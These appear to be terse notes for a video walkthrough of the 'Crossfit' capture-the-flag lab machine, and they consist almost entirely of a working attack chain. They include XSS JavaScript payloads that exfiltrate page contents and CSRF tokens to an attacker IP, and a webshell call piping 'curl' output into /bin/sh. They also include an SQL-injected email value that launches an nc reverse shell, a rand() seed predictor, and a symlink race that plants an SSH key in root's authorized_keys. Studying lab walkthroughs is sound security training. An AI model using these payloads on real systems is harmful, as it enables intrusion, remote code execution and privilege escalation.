---
description: 'Notes for https://youtu.be/jSYRyhY9JuE'
---

# Crossfit

## User

### Payload.js \(browse to page & retrieve contents\)

```javascript
xhr = new XMLHttpRequest();

xhr.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", 'http://10.10.14.10/?'+xhr.response);
  x.send(null);
}

xhr.open("GET", 'http://ftp.crossfit.htb/accounts/create', false);
xhr.send(null);
```

### Register.js \(send POST request as victim\)

```javascript
user = 'foo'
pass = 'foo'

xhr = new XMLHttpRequest;
xhr.withCredentials = true;

xhr.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", 'http://10.10.14.10/?'+xhr.response);
  x.send(null);
}
xhr.open('GET', 'http://ftp.crossfit.htb/accounts/create', false);
xhr.send(null);

r = /token" value="(.*)"/g;
token = r.exec(xhr.responseText)[1];

var params = '_token=' + token + '&username=' + user + '&pass=' + pass
xhr.open('POST', "http://ftp.crossfit.htb/accounts", false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
```

### Shell.js \(execute webshell command via XSS\)

```javascript
xhr = new XMLHttpRequest();

xhr.onload = function() {
  x = new XMLHttpRequest();
  x.open("GET", 'http://10.10.14.10/?'+xhr.response);
  x.send(null);
}

xhr.open("GET", 'http://development-test.crossfit.htb/xct.php?xcmd=curl 10.10.14.10/x|/bin/sh', false);
xhr.send(null);
```

## Root

### Guess.c

```c
int main (void){
	srand(time (0));
	printf("%d", rand());
	return 0;
}
```

### Become ftpadm

```bash
su -s /bin/bash -c 'echo 123>/srv/ftp/messages/123' ftpadm
```

```text
insert into users (id,email) VALUES (0,'lucy@localhost --wrong-argument || nc.traditional 10.10.14.10 1337 -e /bin/sh');
```

### Race to Root \(as hank\)

```bash
while true; do ln -s /root/.ssh/authorized_keys /var/local/$(echo -ne $(./guess)1000 | md5sum | awk '{ print $1 }') 2>/dev/null; done
```

```text
insert into messages (id, name, email, message) VALUES (1000, 'ssh-ed25519', 'xct@vulndev', 'AAAAC3NzaC1lZDI1NTE5AAAAINvEpPGmpbIYTXl69lGbFlPa137agV6rvHGq5PgU5vsF');
```

